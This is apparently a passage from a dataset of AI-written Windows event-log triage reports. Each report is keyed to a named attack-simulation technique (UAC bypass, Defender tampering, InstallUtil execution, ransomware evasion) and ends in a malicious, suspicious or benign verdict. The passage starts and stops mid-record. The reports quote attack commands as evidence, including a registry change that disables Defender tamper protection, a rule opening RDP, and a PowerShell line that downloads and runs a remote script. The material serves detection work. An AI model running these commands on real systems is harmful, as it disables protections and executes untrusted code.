   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user without a clear administrative context could imply administrative-level activities that are not typical unless performed during specific administrative tasks.

4. **Microsoft Edge Update Activity**:
   - There is extensive logging related to Microsoft Edge Update processes. Although frequent updates can be routine, the presence within a `Temp` directory (`EUC22D.tmp`) for an executable such as `MicrosoftEdgeUpdate.exe` might need further review to confirm legitimacy.

5. **Time Synchronization Events**:
   - The Windows Time Service events indicate synchronization activities, which appear routine. However, any configuration changes or discrepancies should be verified against policy or expected operating conditions.

### Conclusion

Based on the log entries analyzed:

- The command to disable UAC notifications through a registry change is particularly concerning and tends to be associated with malicious activities, given the potential to suppress alerts for further malicious operations.
- Despite benign-looking Edge update activities, the presence of processes in temporary directories alongside registry modifications raises red flags.

**Resolution**: **SUSPICIOUS**

Given the registry modification and high integrity process executions, further investigation is warranted. The following steps are recommended:
- **Immediate Review**: Validate the origin and purpose of the registry modification.
- **Integrity Checks**: Scan the affected system for malware or unauthorized software.
- **User Activity Monitoring**: Track the actions of the `admin_test` account to verify legitimate use.
- **Audit and Remediate**: Ensure security policies are enforced, and unauthorized changes are rectified.

This activity suggests suspicious behavior that requires additional investigation to determine if malicious actions have occurred and to ensure the system's security is intact."
Indirect Command Execution - conhost.exe,"Upon reviewing the logs provided:

### Observations:

1. **Time Changes**:
   - The Security and System logs show multiple time change events controlled by `LOCAL SERVICE` using the `svchost.exe` process. Time alteration can be indicative of attempts to cover tracks or synchronize timing for certain operations, but could also be due to time synchronization adjustments typical on Windows systems.

2. **PowerShell Logging**:
   - The PowerShell log section was empty. Without detailed PowerShell activity, it is challenging to determine whether any malicious scripts were executed which is commonly a vector for attacks.

3. **Sysmon Log Analysis**:
   - Sysmon logs show standard usage of command line tools such as `whoami.exe`, and processes associated with Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`, `EdgeUpdateSetup.exe`), which are part of legitimate software maintenance activities and not inherently suspicious due to their context.
   - No explicit evidence of privilege escalation or spawning of anomalous processes (like Crypto mining tools, unusual binaries) was detected from the logs from common attack vectors.

4. **Security Log Analysis**:
   - Consists of time change events, providing no direct indicative malicious activity beyond administrative task execution.

5. **Application Log Analysis**:
   - The logs mention services stopping (related to the EdgeUpdate), typical with application updates.
   - The Software Protection Platform Service executed a rule which might pertain to activation and licensing tasks usually not worrisome unless exploited.

### Summary:

The logs predominantly display system routine operations involving time changes and Edge updates. No clear patterns or markers were found that indicate a discernible malicious intrusion or threat. The logs have typical administrative activities consistent with an automated software update routine, making them appear benign in context.

### Resolution:

**BENIGN** - The current log evidence suggests operational system maintenance and lacks distinct signs of malicious activity. However, absence of detailed PowerShell logs means some potentially suspicious command-line activity warrants verification. Regular review and enhanced PowerShell logging/failure indicators would be prudent."
Activate Windows NoRun Group Policy Feature,"**Detailed Analysis of the Logs:**

1. **Process Execution and Command-Line Activity:**
   - Several instances of `whoami.exe`, `hostname.exe`, `conhost.exe`, and `cmd.exe` are present. While `whoami.exe` and `hostname.exe` are typically benign utilities used to retrieve system information, their repeated execution could indicate scripted or automated activity.
   - The execution of `wevtutil.exe` is observed multiple times. This tool can be used to query information about event logs and is often leveraged in a benign context. However, frequent sequential executions might require scrutiny to determine if logs are being deleted or queried excessively for concealment. There's no specific evidence of misuse here.
   - A notable command line involving `cmd.exe` alters the Windows registry to disable the 'Run' command (`reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f`). This action is highly suspicious as it alters user capabilities without apparent administrative action or consent. Such behavior is indicative of an attempt to limit user actions, often seen in malware activity.

2. **Parent-Child Process Relationships:**
   - The parent process for several command executions, including the registry alteration and system executable accesses (`whoami.exe`, `hostname.exe`, `cmd.exe`), is `wsmprovhost.exe`. This process is related to Windows Remote Management and is often seen in remote execution contexts.
   - The presence of processes operating under high integrity and SYSTEM level for tasks related to system modification detects elevated privilege usage—a typical red flag in unauthorized activities.

3. **Integrity Levels and User Context:**
   - The suspicious activities occur under accounts such as `SERVER002\admin_test` with high integrity levels, aligning with potential illicit privilege escalation exploits or unauthorized use of privileged accounts.

4. **Potential Indicators of Compromise:**
   - The registry modification disabling a key user function (`NoRun` policy) without corresponding authorized administrative activities is a prominent indicator of compromise.
   - Background updates for software like Microsoft Edge appear legitimate but require validation against typical system update processes to ensure no tampering has occurred.

5. **Time Source and System Time Adjustments:**
   - System time adjustments linked with intermittent network responses (`time.windows.com`) suggest involvement of time service management. Any anomalies here can signify time-based deceptive activities but no direct issues uncovered in logs.

**Assessment:**
Upon review, the combination of unauthorized registry modifications intended to restrict user capabilities, paired with potentially disguised process executions under privileged contexts, strongly indicates malicious intent.

**Resolution: MALICIOUS**
The logs reflect potentially unauthorized activity, especially around registry manipulation which immediately raises a threat alert. Immediate mitigation includes:
- Conducting a thorough endpoint forensic analysis for further indicators of compromise.
- Reviewing user access logs and network activities around `SERVER002\admin_test`.
- Implement tighter controls and monitoring around remote execution tools and high-integrity level processes.
- Restoring altered registry values and ensuring all subsequent process executions are fully sanctioned and documented."
Creating W32Time similar named service using sc,"Based on the provided Windows event logs, several activities stand out as suspicious and potentially malicious:

1. **Creation of a Suspicious Service**:
    - The logs show the creation of a service named ""win32times"" with a command line to execute `cmd /c start c:\data.004_NonExistingScript.ps1`. It's unusual to create a system service to execute a script, especially from a path that does not conform to standard system directories. This could indicate an attempt to persist malware or execute scripts with elevated privileges.
    - Command Line in Sysmon Event ID 1 (Process Creation):
      ```
      ""cmd.exe"" /c sc create win32times binPath= ""cmd /c start c:\data.004_NonExistingScript.ps1"" & sc qc win32times
      ```

2. **Service Account Usage**:
    - The service is set to run under the ""LocalSystem"" account, which has extensive privileges on the system. This is a common tactic employed by attackers to ensure that their malicious activities have the necessary permissions.
  
3. **Multiple Sysmon Events**:
    - Frequent execution of critical system utilities like `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` suggests potential misuse or chaining of processes to perform unauthorized activities. 
   
4. **Network Updates**:
    - The system logs contain normal Windows Update activities, including updates to Microsoft Defender, which typically are benign and related to the system's routine operations.

5. **Security Logs**:
    - Multiple failed credential operations related to Microsoft accounts are logged, but these entries are less concerning compared to the unusual service creation and script execution behavior.

**Assessment**: The creation of the service ""win32times"" with an intent to execute a non-existing PowerShell script using `cmd.exe` and the privilege level used suggests manipulative behavior that is indicative of a potential compromise.

**Resolution**: **MALICIOUS**

**Guidance**:
- Perform immediate containment procedures to isolate the system from the network to prevent potential spread or exfiltration.
- Conduct a full forensic investigation to identify additional indicators of compromise (IoCs) and assess the extent of any potential breach.
- Analyze the intention behind the non-existing script execution and potentially related files on the system.
- Reset passwords and review access permissions for users, especially those with elevated privileges.
- Consider engaging with an incident response team if the internal resources lack capacity for a thorough investigation."
Open a local port through Windows Firewall to any profile,"Upon carefully analyzing the provided event logs from the Windows host, here is a detailed analysis focusing on identifying any suspicious or anomalous behavior:

### Observations and Analysis:

1. **Use of PowerShell Command:**
    - There is a PowerShell command execution captured in both the Sysmon and PowerShell logs: 
      ```
      powershell.exe & {netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any}
      ```
    - This command is used to add a firewall rule to allow incoming traffic on TCP port 3389, which is typically used for RDP (Remote Desktop Protocol). The change to firewall rules, especially on a server, is a significant operation and may open the system to external access.

2. **Netsh Execution:**
    - Subsequent to the PowerShell command, `netsh.exe` is invoked to implement the firewall rule allowing traffic on port 3389. This indicates that the PowerShell command executed successfully and was potentially intended to expose the system for remote access, which could be deemed a security risk if unauthorized.

3. **Frequent Process Activity:**
    - There are numerous instances of processes like `conhost.exe`, `whoami.exe`, `wevtutil.exe`, and `HOSTNAME.EXE` being executed. While `conhost.exe` is commonly linked with CMD/Console windows, overlapping frequent executions can sometimes indicate process masquerading or be leveraged in living-off-the-land binaries (LOLBins) attacks, yet in isolation might be normal depending on server activity.

4. **High Integrity Level Executions:**
    - Processes are being executed with a high integrity level under the user `SERVER002\admin_test`, which holds administrative privileges. While high integrity indicates elevated privileges, the context of how these processes are executed is crucial.

5. **Microsoft Edge Update Activity:**
    - Multiple entries related to Microsoft's Edge Update processes suggest routine software update activities. Such actions are not inherently malicious but should be noted as part of system maintenance logs.

6. **Time Synchronization:**
    - System log entries related to time synchronization (Event ID 35) indicate normal time management operations using `time.windows.com`. These actions are routine and generally unrelated to malicious activities.

### Assessment:
- **Potential Indicators of Malicious Activity:**
  - The execution of PowerShell and netsh to alter firewall rules and allow RDP traffic is highly suspicious and indicative of a potential setup for unauthorized remote access. Such actions are frequently employed in lateral movement techniques during a cyber intrusion.

### Resolution:
- The most significant observation is the change in firewall settings allowing RDP access, which was performed using PowerShell and netsh commands under an administrative account. This is a strong indicator of potentially malicious or unauthorized activity.
 
### Recommendation:
- Investigate the `SERVER002\admin_test` account for any signs of compromise or unusual behavior. 
- Confirm whether the firewall rule change was authorized as part of any maintenance or remote support actions.
- Conduct a comprehensive review for any lateral movement and potential data exfiltration indications.
- Consider closing the opened RDP port if it is not needed and review security policies surrounding such changes.

**Resolution: MALICIOUS**
- Due to the unauthorized modification of firewall rules allowing external RDP access using administrative privileges, the logs indicate a high likelihood of malicious activity requiring immediate attention and response."
Abusing Windows TelemetryController Registry Key for Persistence,"### Analysis of the Windows Event Logs

#### Indicators of Suspicious or Anomalous Behavior

1. **Multiple Executions of `wevtutil.exe` and `conhost.exe`:**
   - The Sysmon logs reflect multiple executions of `wevtutil.exe` and `conhost.exe` in quick succession, all initiated by the user `SERVER002\admin_test`. The `wevtutil.exe` tool is commonly used to export, archive, and clear event logs, which could indicate an attempt to manipulate or erase logs to cover tracks post malicious activity. This pattern is unusual and should be examined further.

2. **Registry Manipulation with `cmd.exe`:**
   - A command executed using `cmd.exe` to add a registry key (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey`) with a command to execute `notepad.exe`. The manipulation of registry keys for persistent access or to execute specific applications can be a sign of malware attempting to embed itself within the system configuration.

3. **Process Execution Integrity Level:**
   - The processes such as `cmd.exe` and `reg.exe` are executed under the `High` integrity level, indicating that they have more privileges than a standard process. This could be a sign of privilege escalation.

#### Signs of Potential Malicious Activity

- **The command line usage within `cmd.exe` and `reg.exe` suggests a deliberate attempt to modify system settings, potentially for malicious purposes**. Although `notepad.exe` is a benign application, altering registry keys to execute specific commands or processes indicates a possible attempt at setting up a malicious operation or persistence mechanism.

- **Absence of known Sysmon RuleName**: All Sysmon events are tagged with `RuleName: -`, suggesting the actions being captured do not match existing monitored or expected behavior profiles. While this might be routine, in context with suspicious registry modification, it amplifies the potential risk sign.

#### General Observations

- **Timed Edge Update Activities**: Several processes related to `Microsoft Edge Update` are observed. These activities are aligned with legitimate software update behavior. The involvement of `NT AUTHORITY\SYSTEM` suggests these processes are being executed legitimately by system services.

- **Normal Time Synchronization**: Time synchronization using `time.windows.com` appears routine and does not raise immediate concerns, as this is a standard behavior for system clock synchronization.

### Assessment

The combination of multiple indications of anomalous behavior, particularly the unspecified use of powerful utilities like `wevtutil.exe` and `cmd.exe` for registry operations, warrant deeper investigation. Given these insights, the confidence level for this activity being malicious is bolstered by the registry manipulations executed with elevated privileges.

### Resolution

**SUSPICIOUS**: The logs contain activity that does not conform to typical user behavior patterns and suggests possible malicious intent through system utilities and registry manipulation. Further investigation is necessary, including assessing network activity, deeper registry inspection, and user behavior analytics to confirm whether this activity is benign or malicious."
UACME Bypass Method 56,"Upon reviewing the provided Sysmon logs, we observe several activities that demand further examination to assess the potential indicators of malicious behavior:

### Key Observations:

1. **Suspicious Execution of Akagi64.exe**:
   - The logs include an execution of a binary named `56 Akagi64.exe` from a temporary directory. This execution is facilitated via `cmd.exe` using a command line that looks like: `cmd.exe /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\script\56 Akagi64.exe`.
   - The parent process is `PowerShell.exe` indicating that PowerShell was first used, possibly to construct or test the existence of this path prior to execution. Execution from a `Temp` directory is unconventional and a known tactic used by adversaries to stage payloads.

2. **Execution of Critical System Utilities**:
   - The logs show instances where critical utilities such as `wevtutil.exe` (Windows Event Utility), `conhost.exe`, and `WhoAmI.exe` have been executed around the same timeframe. These utilities might be leveraged for various purposes including but not limited to enumeration, clearing event logs, or modifying the system environment.
   - Frequent invocation of `wevtutil.exe` particularly raises red flags as it's potentially used for manipulating event logs, which is a common tactic in evading detection.

3. **Unusual Appearance of Command Line Arguments**:
   - The logging of command line arguments such as ""cmd.exe /c echo ... Akagi64.exe"" are indeed peculiar, as they are uncommon for routine administrative tasks and might suggest process injection or file obfuscation attempts.

4. **Hash Values**:
   - The file `56 Akagi64.exe` is noted for a hash value of `SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`. Given its execution pattern, this file requires further analysis through malware analysis labs or threat intelligence feeds to determine its reputation.

5. **Microsoft Edge Update Activities**:
   - There are several activities related to Microsoft Edge Update processes. However, they appear to be standard, carried out under NT AUTHORITY\SYSTEM user context. These do not inherently suggest malicious action but should be verified if they correspond with known update schedules or organizational policy.

### Assessment:

Given the above observations, particularly noting the execution from a `Temp` directory and suspicious PowerShell-related activities, a clear indicator of suspicious activity is present. However, without a direct confirmation of malicious payload or behavior (e.g., confirmed malware), it is challenging to categorically declare it as outright malicious based on logs alone.

### Recommendation:

- Conduct further investigation specifically targeting `56 Akagi64.exe`. Retrieve the file from the system if possible, upload it to a sandbox environment to analyze its behavior, and check the hash against threat intelligence sources.
- Review logs surrounding the time of these events for any signs of unusual behavior or alerts from antivirus software.
- Verify if this activity correlates with any known threat actor TTPs (Tactics, Techniques, and Procedures).
- Consider performing a digital forensic analysis on the affected system to seek subtle indicators of compromise that are not apparent from log inspection alone.

### Resolution: **SUSPICIOUS**

The resolution, based on the presented log data, is SUSPICIOUS, necessitating additional investigation to determine if this activity is indeed malicious."
Tamper Win Defender Protection,"**Detailed Analysis:**

1. **Time Change Events (Security and System Logs)**
   - Event ID 4616 from the security log and Event ID 1 from the system log shows that the system time was changed twice in a very short time frame.
   - Both events reference `svchost.exe`, which is a legitimate Windows process, and the user account involved is `NT AUTHORITY\LOCAL SERVICE`. Although system time changes can be legitimate, frequent and rapid time changes could potentially indicate tampering, possibly used to cover tracks or manipulate time-based logs and schedules.

2. **Process Execution (Sysmon Log)**
   - We observe multiple instances of `wevtutil.exe` and `conhost.exe` run by `SERVER002\admin_test`. These processes are involved in managing Windows event logs and console operations, respectively. The clustered timestamps suggest batch operations or scripting, which could be part of normal administrative activities.
   - More notably, there is an execution of `cmd.exe` with a command line to modify the registry to disable Windows Defender’s TamperProtection. This is a strong indicator of potentially malicious behavior aimed at weakening system defenses:
     - **Command:** `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f`
     - The integrity level is high, suggesting that this was executed with elevated privileges, furthering the suspicion of intended malicious activity.

3. **Microsoft Edge Update Activity**
   - There is repeated and frequent execution of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`), indicating an update or maintenance operation. These processes run under `NT AUTHORITY\SYSTEM`, maintaining system integrity.
   - Edge Update processes are typically benign, but considering the context, they should be verified to ensure they aren't being used as a vector by malicious actors.

4. **Registry Modification by `reg.exe`**
   - Registry modifications disabling security features, as seen here, are standard tactics used by attackers to persist on systems while reducing defenses.
   - The action is accompanied by the execution of `reg.exe` under the same administrative user, reinforcing the scenario of malicious intent.

**Assessment and Resolution:**

- The frequent execution of administrative and system-level processes by a user account, coupled with the attempt to disable a key security feature (Windows Defender’s TamperProtection), signals potential malicious activity.
- The use of trusted system executables like `cmd.exe` to perform these actions aligns with tactics employed by threat actors to evade detection.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Containment:** Immediately isolate the affected host to prevent lateral movement and further compromise within the network.
- **Investigation:** Conduct a thorough investigation of any similar activities across other systems, focusing on abnormal use of administrative tools and processes.
- **Remediation:** Reinstate all modified security settings and ensure security software is operating normally. Evaluate the need for system restoration or reimage.
- **Monitoring:** Implement enhanced monitoring for activity involving registry changes and command execution by administrative accounts.
- **Response Plan:** Review and potentially enhance incident response protocols to cover gaps exposed by this incident."
Control Panel Items,"Upon examining the Windows event logs, the following observations were made regarding potential indicators of malicious activity:

### Observations:
1. **Sysmon Logs:**
   - Multiple processes were launched in quick succession by the user ""SERVER002\admin_test"", starting with PowerShell (`powershell.exe`) and `wevtutil.exe`.
   - The execution of `wevtutil.exe` and `control.exe` with suspicious command line arguments can be indicative of attempts to disable event logs or hide activities, as `wevtutil.exe` is often used in such contexts.
   - `cmd.exe` was run with a command line indicating the execution of a file (`calc.cpl`) from a user's temp directory, which is typically unusual and can indicate an attempt to run unauthorized scripts or code.
   - `rundll32.exe` was observed executing `calc.cpl` in a manner that suggests possible DLL execution for malicious purposes, as using `rundll32.exe` to execute DLLs or control panel files is a common technique in malware operations.

2. **Application Logs:**
   - Repeated stops of the `edgeupdate` service create an anomaly. Normally, such services shouldn't stop frequently without cause. However, without further context, it can be dismissed as potentially benign if it is due to an update.
   - The execution of `MicrosoftEdgeUpdate.exe` is consistent and appears orchestrated, but the patterns resemble normal update processes.

### Assessment:
- The logs reveal patterns of command executions and process launches that are suspicious and could potentially indicate malicious activity. Specifically, the execution patterns involving `powershell.exe`, `wevtutil.exe`, and processes initiated from temporary directories suggest possible exploitation or malicious script execution.
- The observed use of command line executions and potential usage of scripts or files from temporary directories (`calc.cpl`) is also concerning and suggests potential malware execution attempts.

### Threats or Risks Identified:
- **Potential presence of malicious scripts/executables:** The execution of files from temp directories (e.g., `calc.cpl`) and use of built-in Windows tools (`wevtutil.exe`, `rundll32.exe`) indicate possible unwanted or unauthorized activities.
- **Privilege misuse or escalation attempts:** While most processes were executed under a high integrity level, the nature of processes and script execution indicates a risk of privilege escalation or misuse.

### Resolution and Guidance:
- Resolution: **SUSPICIOUS**
- This activity warrants further investigation. It is recommended to:
  - Use network and endpoint security solutions to further trace suspicious activities, focusing on potentially anomalous user ""SERVER002\admin_test"".
  - Scan system files, especially in the temp directories, for malware or unauthorized scripts.
  - Monitor for persistence mechanisms and consider isolating the host if further suspicious activity is detected.
- If unauthorized scripts or malware are confirmed, proceed with containment and eradication as per the organization's incident response plan."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Based on the provided log entries from various sources, here's a detailed analysis focusing on potential indicators of malicious activity:

### Key Observations:

1. **PowerShell Execution**:
   - The execution of PowerShell with a command to install a package from a local temporary directory is notable: `PowerShell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_EXE.msi' }}`. 
   - PowerShell is often used for legitimate administrative tasks, but it is also a frequent target and tool for adversaries due to its capabilities and extensive command line utility. The installation from a temp directory is atypical for most enterprise software distributions.

2. **Wevtutil and Conhost Executions**:
   - The presence of multiple `wevtutil.exe` and `conhost.exe` executions with the user `SERVER002\admin_test` is observed. `wevtutil.exe` is a command-line utility used to access event logs, while `conhost.exe` is associated with console windows. Combined or frequent execution of these processes can suggest log manipulation, though they can also appear in legitimate contexts. However, the frequent and successive activation without additional context could suggest evasion techniques, often used by malicious entities to tamper with or read system logs.

3. **Suspicious File in Installer Directory**:
   - A file located under `C:\\Windows\\Installer\\MSI9CF4.tmp` with the name `PrintArgs.exe` indicates possible suspicious behavior as such files in the installer directory without proper attributes like File Version or Product can be indicative of dropped payloads by malware following an exploitation phase.

4. **Microsoft Edge Update Processes**:
   - Frequent legitimate update processes and services related to Microsoft Edge are observed. These represent standard operations and maintenance tasks performed by the Edge browser and do not show signs of injecting or executing potentially harmful content.

### Conclusion:

- **PowerShell activity**, particularly because of its capabilities and potential for abuse, requires further investigation to determine the intent and origin of the command.
- **Wevtutil.exe and conhost.exe usage** need to be verified for context, like legitimate administrative operations versus signs of log tampering activity, especially because they are invoked in quick succession.
- **The appearance of a potentially unauthenticated executable (MSI9CF4.tmp)** under Windows Installer prompts for validation of its authenticity and the source of its execution context to rule out any malicious activities.

### Recommended Actions:

1. **Detailed Review and Analysis**:
   - Investigate the PowerShell execution: Verify the source of the .msi file, the necessity of the installation, and whether it matches approved software deployment workflows.
   - Cross-reference wevtutil and conhost activities against administrator actions and scheduled tasks to verify legitimacy.
   - Conduct malware scans, especially for the suspicious .tmp file in the Windows Installer directory.
   
2. **Broader Network Activity**:
   - Assess network logs for any abnormal outbound connections following these executions as an additional piece of evidence for identifying potential data exfiltration.

Based on the analysis, the most appropriate resolution is:

**SUSPICIOUS**

The logs present multiple activities that are commonly benign in isolation but require more stringent analysis due to the context and frequency of their occurrence. Further investigations should be conducted to ensure these activities are standard and not indicative of malicious behavior."
Disable Windows Toast Notifications,"Upon reviewing the provided Windows event logs, several points require attention:

1. **Time Synchronization Logs:**
   - The logs indicate multiple adjustments to the system time on `Server002`. This is seen in the System log where `svchost.exe` adjusted the time slightly backward and forward within the same second. These adjustments are typical behavior and do not necessarily indicate malicious activity but should be confirmed as part of routine system maintenance.

2. **Process Executions:**
   - The Sysmon logs show repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is used for managing event logs, and while its presence is normal, frequent and automated executions, especially in rapid succession, are worth monitoring to ensure they are expected and not part of an unauthorized data gathering or cleansing process.
   - Additionally, execution of `cmd.exe` with a command to modify the registry (`reg add`) is observed. This action changes a user notification setting (`ToastEnabled`), which may be legitimate but should be verified with the user or administrator responsible to ensure it was intentional and not part of unauthorized tampering.

3. **Process Tree Analysis:**
   - Processes such as `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, and `reg.exe` are executed in sequence, indicating possible script or task execution under the admin's context. Examining what led to the use of these utilities (for example, if they align with scheduled tasks or admin scripts) would help clarify intent.
   - High integrity level and administrative context used for the processes suggest elevated privileges. It is important to confirm that such executions were legitimate and required.

4. **Network Services:**
   - Various network/service-related processes running under NT AUTHORITY accounts are logged, such as `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe`. Their presence is standard in a normal operating environment, providing there's no abnormal behavior such as unexpected resource usage or connection anomalies.

5. **Software Licensing:**
   - The application log recorded a `Microsoft-Windows-Security-SPP` event, which relates to software licensing checks. The timestamp matches other activities but does not show suspicious behavior on its own unless unauthorized software use is detected.
   
**Assessment:**

Analyzing all logs holistically suggests a mixture of standard and slightly abnormal activities. The time adjustments, process executions indicative of user scripts or scheduled tasks, and registry changes should be confirmed with operational practices and expected administration activities. Unless corroborative evidence is found, such as unauthorized remote access or data leakage tools, these indicators do not definitively signal malicious activity.

**Resolution: SUSPICIOUS**

While no explicit malicious activities are confirmed, the nature and alignment of some process executions and configuration changes necessitate further investigation to rule out any unauthorized behavior or misuse of administrative privileges. It is advisable to:
- Review related user activities around the time of these logs to ensure compliance with organizational policies.
- Check for any unintended system changes or security incidents involving user `admin_test`.
- Verify that all processes align with documented administrative tasks and authorized actions."
Obfuscated Command in PowerShell,"Based on the analysis of the provided log entries from the Windows host, several observations can be made:

1. **Windows Time and Security Logs**:
   - The series of `EventID 4616` in the security log indicates time change events, but these are linked to the use of `svchost.exe` and attributed to the `LOCAL SERVICE` account, which typically manages system time updates. This behavior in itself is not necessarily suspicious.
   - `EventID 35` related to time synchronization with an online time source (`time.windows.com`) shows normal system activity for maintaining accurate system time.

2. **Windows Update and System Logs**:
   - `EventID 44` and `EventID 43` in the Windows update log show the update of Microsoft Defender Antivirus, which is a regular and legitimate activity.
   - There is a regular execution update process (`wuauclt.exe`) seen in the `Sysmon` logs, which is associated with system updates and matches the Windows Update logs, thereby appearing benign.

3. **PowerShell Logs**:
   - The PowerShell log events contain obfuscated scripts being executed by `powershell.exe`. The script decodes the character sequence using a type [Char] conversion and appears as an obfuscated and potentially harmful command. This usage is typical for obfuscating malicious scripts to avoid detection by most security products.

4. **Sysmon Logs**:
   - There are several `Sysmon EventID 1` entries for process creation using PowerShell with obfuscated script commands. This includes the PowerShell execution with the unusual command line arguments for obfuscation, indicative of malicious activity or an attempt to bypass command-line security detections.

The presence of obfuscated PowerShell scripts and the use of high-integrity level execution are suggestive of malicious behavior, which is potentially an indicator of compromise or an attempt to execute unauthorized or harmful actions within the system.

### Conclusion:
Based on the log analysis, the activity observed particularly regarding PowerShell, presents strong indicators of potentially malicious behavior. The obfuscated PowerShell commands imply an attempt to disguise malicious activity or gain unauthorized access.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate investigation and containment are recommended to prevent further execution of potentially malicious scripts.
- Review the PowerShell scripts and command-line history to uncover the purpose and origin of the obfuscated script.
- Check user accounts and access logs for any unauthorized access or privilege escalation.
- Consider strengthening monitoring and alerting on unusual PowerShell activities, especially those involving obfuscation.
- Ensure antivirus and intrusion detection systems are updated and performing regular scans for similar indicators and threats."
WinPwn - UAC Bypass DccwBypassUAC technique,"Based on the investigation of the provided Windows event logs from the machine named ""Server002"", the analysis is as follows:

1. **System Log Analysis:**
   - There are a series of Microsoft-Windows-Kernel-General and Microsoft-Windows-Time-Service events related to time changes. The time setting is adjusted backward, indicating possible system time tampering. Changing system times can be legitimate but may suggest attempts to hide malicious activities or manipulate logs.

2. **Security Log Analysis:**
   - Event ID 4616 indicates that the system time was changed, logged under the LOCAL SERVICE account. The association of time changes with other potentially suspicious activities can indicate nefarious intentions if combined with other unusual activities.

3. **Windows PowerShell Log Analysis:**
   - Multiple entries show the execution of PowerShell with a particularly suspicious command: `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/Creds/master/script/script')}`. This command uses Invoke-Expression with New-Object Net.WebClient to download and execute a script from a remote URL, which is a common method of executing malicious scripts.

4. **Sysmon Log Analysis:**
   - The entries document the execution of standard Windows utilities such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`. Specifically, the execution of PowerShell with the same suspicious command as in the PowerShell log is documented here, highlighting potential malicious activity.
   - Wevtutil.exe is a tool for event log management and not inherently suspicious unless used in a malicious context. Conhost.exe executions seem routine but are often used to mask unusual script execution.

5. **Application Log Analysis:**
   - No indicators of malicious activity in the application logs.

**Assessment and Resolution:**

- The PowerShell logs reveal attempts to execute scripts from a remote server, which is a direct indicator of potential malware or illicit access to download and execute unauthorized scripts.
- The sysmon logs confirm the execution of these scripts through PowerShell, backing up the suspicious findings in the PowerShell logs.
- The manipulation of system time, observed in the system and security logs combined with the above findings, further adds to the suspicion.

Given these points, the collected evidence strongly suggests malicious activity. The use of PowerShell to download and execute scripts from a potentially malicious remote repository is a clear indicator of a compromise. 

**Final Resolution: MALICIOUS**

**Guidance:**
- Immediate containment: Disconnect the affected system from the network to prevent further communication with the remote host.
- Perform a full malware scan and analysis to determine the extent of the compromise.
- Review and secure PowerShell execution policies and monitor network activity for any unauthorized data exfiltration attempts.
- Evaluate system integrity and consider system restoration to a known safe state post-analysis.
- Reinforce auditing and monitoring procedures to detect and prevent similar threats in the future."
InstallUtil Install method call,"### Analysis:

1. **PowerShell Events:**
   - PowerShell logs show the execution of `InstallUtilTestHarness.ps1` script located in a temporary directory. The script appears to involve the creation and execution of a .NET assembly (`data.004.dll`) using `InstallUtil.exe`. 
   - The script specifically mentions the expected and actual output, with a condition to throw an error if they don't match, which indicates it's likely used for testing or installation processes.
   - The location and execution from a temporary directory can potentially indicate harmful activities if not expected or authorized, especially when dealing with .NET assemblies and `InstallUtil.exe`.

2. **Sysmon Events:**
   - Numerous Sysmon events indicate the execution of processes related to Windows system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and repeated executions of `wbem\\WmiPrvSE.exe`.
   - `InstallUtil.exe` is involved here as well, and this activity is heavily logged which overlaps with the PowerShell script execution.
   - Some events involve Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`) which align with known update mechanisms but could also represent anomaly if exploited.

3. **Security and System Logs:**
   - There are no entries provided in security and system logs, restricting visibility into broader system-level activities or changes in security settings.

4. **Application Log:**
   - This log contains an entry from edge update, indicating a stopped service, which is typical and expected for these processes managing updates or configurations.

### Suspicious Indicators:
- The execution of scripts from temporary directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1`) can be potentially malicious. It is known behavior for certain types of malware to use temporary directories for staging payloads.
- Usage of `InstallUtil.exe` with `data.004.dll` is a known approach for .NET-based malware to achieve execution as it allows code to be run as part of the installation process.
  
### Assessment:

Based on the evidence provided from the PowerShell and Sysmon logs, there is suspicious behavior identified:

- **Privilege Escalation and Execution Methods:** 
  Scripts being run via PowerShell which includes building and executing an assembly using `InstallUtil.exe`, typically seen in malware exploiting system utilities for persistence or initial access.
  
- **Testing and Validation in Logs:**
  Presence of `Invoke-BuildAndInvokeInstallUtilAssembly` with explicit result checks and error handling could point to development or malicious testing prior to full deployment.

### Guidance:

1. **Immediate Actions:**
   - Verify the legitimacy of the PowerShell scripts and `.dll` file. Confirm whether they are part of an authorized test, installation, or maintenance task. 
   - Monitor processes linked to the temporary directories for unauthorized access attempts or anomalies.
   - If unauthorized use is confirmed, isolate affected systems to prevent lateral movement within the network.

2. **Further Investigation:**

"
Scarab Ransomware Defense Evasion Activities,"The provided event logs have been thoroughly analyzed for any indicators of malicious activity. Here is a detailed analysis of the logs:

1. **Application Log**:
   - The entries from the ""Software Protection Platform Service"" and ""EdgeUpdate"" indicate standard operations related to software licensing and updates. These logs do not display any suspicious behavior or anomalies.

2. **Security Log**:
   - Event ID 4616 and 4624 show time changes and successful logon events which are typical; however, the precision timing and sequence are unusual.
